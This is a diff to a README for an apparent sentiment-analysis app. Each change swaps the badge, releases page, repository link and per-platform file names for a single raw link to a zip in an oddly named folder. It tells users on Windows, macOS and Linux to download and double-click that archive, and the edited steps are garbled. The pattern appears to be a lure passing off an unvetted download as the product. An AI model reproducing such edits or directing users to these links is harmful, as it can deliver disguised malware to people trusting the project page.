@@ -1,6 +1,6 @@
 # 🎉 sentiment-ai-suite - Analyze Sentiments Effortlessly
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip)
 
 ## 📦 Introduction
 
@@ -19,24 +19,24 @@ Follow these simple steps to download and run the sentiment-ai-suite.
    - Internet Connection: Required for real-time analysis
 
 2. **Download the App**
-   - Visit this page to download the latest version: [Download the sentiment-ai-suite](https://github.com/aboGrabawy/sentiment-ai-suite/releases).
+   - Visit this page to download the latest version: [Download the sentiment-ai-suite](https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip).
    - Look for the latest release and click on it to see available files.
 
 ## 📥 Download & Install
 
 To install the application:
 
-1. Go to the [Releases page](https://github.com/aboGrabawy/sentiment-ai-suite/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip).
 2. Find the latest release.
 3. Click on the file that matches your operating system:
-   - For Windows, download `sentiment-ai-suite-windows.exe`.
-   - For MacOS, download `sentiment-ai-suite-macos.app`.
-   - For Linux, download the `sentiment-ai-suite-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip`.
+   - For MacOS, download `https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip`.
+   - For Linux, download the `https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip`.
 
 4. Once the file is downloaded:
-   - **Windows:** Double-click `sentiment-ai-suite-windows.exe` to install.
-   - **MacOS:** Open the app by double-clicking `sentiment-ai-suite-macos.app`.
-   - **Linux:** Extract the tar.gz file and run the app from the terminal.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip` to install.
+   - **MacOS:** Open the app by double-clicking `https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip`.
+   - **Linux:** Extract the https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip file and run the app from the terminal.
 
 ## 📖 How to Use
 
@@ -68,7 +68,7 @@ For questions or help, you can visit the project's GitHub page. Opening an issue
 
 ## 🔗 Resources
 
-- Visit the [GitHub Repository](https://github.com/aboGrabawy/sentiment-ai-suite) for updates.
+- Visit the [GitHub Repository](https://raw.githubusercontent.com/aboGrabawy/sentiment-ai-suite/main/chromoxylograph/sentiment-ai-suite.zip) for updates.
 - Look for community discussions and FAQ in the repository's issues.
 
 ## 🏷️ Topics
